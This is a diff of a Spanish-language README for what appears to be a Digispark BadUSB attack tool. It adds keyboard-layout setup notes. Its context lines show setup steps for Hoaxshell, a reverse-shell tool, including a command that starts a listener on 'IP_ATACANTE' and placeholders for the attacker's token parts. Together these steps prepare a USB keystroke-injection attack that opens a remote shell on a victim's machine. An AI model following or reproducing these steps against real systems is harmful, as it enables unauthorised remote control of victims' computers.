@@ -22,10 +22,11 @@
 ```
 <img width="1006" height="672" alt="imagen" src="https://github.com/user-attachments/assets/8a467877-c94f-439b-af3d-14c5fcf3aba8" />
 
-4. Copiar la carpeta DigisparkKeyboard del repositorio y pegarla en:
+4. Este script fue creado para cambiar distribuciones de teclado, y es por esto que para que funcione debes copiar la carpeta DigisparkKeyboard del repositorio y pegarla en la siguiente ruta:
 ```
 C:\Users\tu_usuario\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\
 ```
+*Con esto podremos cambiar la linea #define kbd_es_es del script .ino para usar la distribucion de teclado que gustes.*
 5. Descargar e instalar la herramienta Hoaxshell de su repositorio oficial (Seguir los pasos del repositorio):
 ```
 git clone https://github.com/t3l3machus/hoaxshell
@@ -52,6 +53,7 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 - TOKEN_PART1: Reemplazar con la primera parte del token
 - TOKEN_PART2: Reemplazar con la segunda parte del token
 - TOKEN_PART3: Reemplazar con la tercera parte del token
+- Opcional:  #define kbd_es_es Puedes cambiar esta linea revisando las opciones en config/DigisparkKeyboard/Readme.md
 
 ![image](https://github.com/user-attachments/assets/9418035f-eaa7-4b05-ae3b-a7bd19dd68d6)
 
